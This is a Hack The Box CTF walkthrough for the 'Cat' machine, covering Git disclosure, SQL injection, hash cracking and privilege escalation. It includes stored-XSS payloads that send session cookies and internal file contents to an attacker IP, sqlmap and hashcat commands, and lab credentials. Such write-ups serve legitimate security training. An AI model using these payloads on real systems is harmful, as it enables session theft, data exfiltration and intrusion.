---
clayout: ctf
title: Cat
date: 2025-06-01
image: /ctf/hack-the-box/machines/cat/info-card.png
type: Hack The Box

ctf:
    - name: Cat
      link: https://app.hackthebox.com/machines/646
      thumbnail: /ctf/hack-the-box/machines/cat/info-card.png
      pwned:
        - link: https://www.hackthebox.com/achievement/machine/585215/646
          thumbnail: /ctf/hack-the-box/machines/cat/pwned.png
---

# Enumeration

## Nmap Scan

We start by scanning the machine with nmap.

```bash
nmap -sC -sV -v -p- -oN cat.nmap 10.10.10.245
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

* Port 22 is running OpenSSH 8.2p1.
* Port 80 is hosting a web service using Apache 2.4.41.
* The HTTP title indicates a redirect to `http://cat.htb/`.

# Web Enumeration

## Hostname Resolution

To properly resolve `cat.htb`, we add an entry to `/etc/hosts`:

```bash
echo "10.10.10.245 cat.htb" | sudo tee -a /etc/hosts
```

## Web Application Overview

Visiting `http://cat.htb/` reveals a cat competition website with features such as:

* Registering and logging in
* Adding a new cat to the competition
* Voting for existing entries

![Website Homepage](/ctf/hack-the-box/machines/cat/cat-website.png)
![Add Cat Page](/ctf/hack-the-box/machines/cat/add-cat.png)

## Directory Enumeration

We use dirsearch to enumerate hidden directories:

```bash
dirsearch -u http://cat.htb/ -o dirsearch.txt
```

This revealed the presence of a `.git` directory.

![Dirsearch Output](/ctf/hack-the-box/machines/cat/dirsearch.png)

## Git Repository Disclosure

We use `git-dumper` to download the Git repository:

```bash
git-dumper http://cat.htb/.git ./git-dump/
```

# Source Code Review

## Database Configuration

```php
$db_file = '/databases/cat.db';
$pdo = new PDO("sqlite:$db_file");
```

The application uses a local SQLite database.

## Admin Panel Restriction

Access to `admin.php` is restricted to a hardcoded user `axel`:

```php
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}
```

## SQL Injection Vulnerability (Conditional)

In `accept_cat.php`, a SQL query inserts the cat name without proper sanitization:

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
```

However, this endpoint is only accessible to authenticated user `axel`.

## Input Filtering in Cat Submission

When submitting a new cat, user inputs (name, age, birthdate, weight) are filtered using regex-based checks:

```php
if (contains_forbidden_content($cat_name, $forbidden_patterns)) {
    $error_message = "Your entry contains invalid characters.";
}
```

## Stored XSS via `username`

In `join.php`, the `username` field is not sanitized and is reflected in `view_cat.php`:

```php
<strong>Owner:</strong> <?php echo $cat['username']; ?><br>
```

This allows for a stored XSS attack:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.14.10:1337/?' + document.cookie, true);
xhr.send();
</script>
```

Using this payload, we can exfiltrate session cookies of the admin user.

![Stored XSS](/ctf/hack-the-box/machines/cat/stored-xss.png)

# Exploitation

## Dumping the Database

Using the stolen `PHPSESSID`, we exploited the SQLi in `accept_cat.php` to extract user credentials:

```bash
sqlmap -u "http://cat.htb/accept_cat.php" \
--data "catId=1&catName=random" \
-p catName \
--cookie="PHPSESSID=kcmnovp0n0a82ofiiiactq0586" \
--level=5 --risk=3 --dbms=SQLite \
--technique=B -T "users" --threads=4 --dump
```

**Extracted Credentials:**

| ID  | Username | Email                                                       | Password (MD5)                   |
| --- | -------- | ----------------------------------------------------------- | -------------------------------- |
| 2   | rosa     | [rosamendoza485@gmail.com](mailto:rosamendoza485@gmail.com) | ac369922d560f17d6eeb8b2c7dec498c |
| …   | …        | …                                                           | …                                |

# Credential Cracking

The password hashes were cracked using `hashcat` with the `rockyou.txt` wordlist:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```text
rosa:soyunaprincesarosa
```

# Initial Access

Using Rosa's credentials, we gained access via SSH:

```bash
ssh rosa@cat.htb
```

# Privilege Escalation

## Discovering Axel’s Credentials

Reviewing Apache logs revealed Axel’s plaintext credentials:

```bash
cat /var/log/apache2/access.log
```

Log snippet:

```text
GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q
```

Using these credentials, we can switch to the `axel` user:

```bash
su axel
Password: ********************
```

The user flag is located in the `/home/axel/user.txt` file.

# Privilege Escalation to Root

## Mail Discovery

During local enumeration, we identified an email belonging to the `axel` user that disclosed internal development details:

```text
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

From this message, we inferred the presence of an internal Gitea server and a repository named `Employee-management`.

To confirm the service, we enumerated listening ports with the following command:

```bash
netstat -punta || ss --ntpu
```

This revealed that TCP port **3000** is open locally:

```bash
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
```

## Accessing the Internal Gitea Service

To access the Gitea instance bound to localhost, we established an SSH tunnel:

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

Navigating to `http://localhost:3000` via a local browser exposed a running instance of **Gitea v1.22.0**.

![Gitea Home page](/ctf/hack-the-box/machines/cat/gitea.png)

Using the same credentials as the `axel` user, we were able to authenticate to the Gitea web interface.

## Exploiting Gitea

A known vulnerability in Gitea version 1.22.0 (Exploit-DB ID: [52077](https://www.exploit-db.com/exploits/52077)) allows for stored Cross-Site Scripting (XSS).

Given that internal communications instruct users to send repository links to `jobert@localhost`, we crafted a malicious payload to exploit this behavior and exfiltrate internal file content:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(data => data.text()).then(data => fetch('http://10.10.14.10:1337/?data=' + encodeURIComponent(data)));">Super repository</a>
```

This payload was embedded into a Gitea repository and referenced in an email to Jobert:

```bash
echo -e "Subject: Click Link\n\nhttp://localhost:3000/axel/random" | sendmail jobert@localhost
```

After several attempts, the XSS payload successfully executed and retrieved the content of the `index.php` file from the internal `Employee-management` repository.

The response included hardcoded credentials:

```php
<?php
$valid_username = 'admin';
$valid_password = '******************';
```

## Root Access

Using the recovered credentials, we authenticated as the `root` user and gained shell access.

![Root shell](/ctf/hack-the-box/machines/cat/root.png)

The root flag is located in the `/root/root.txt` file.
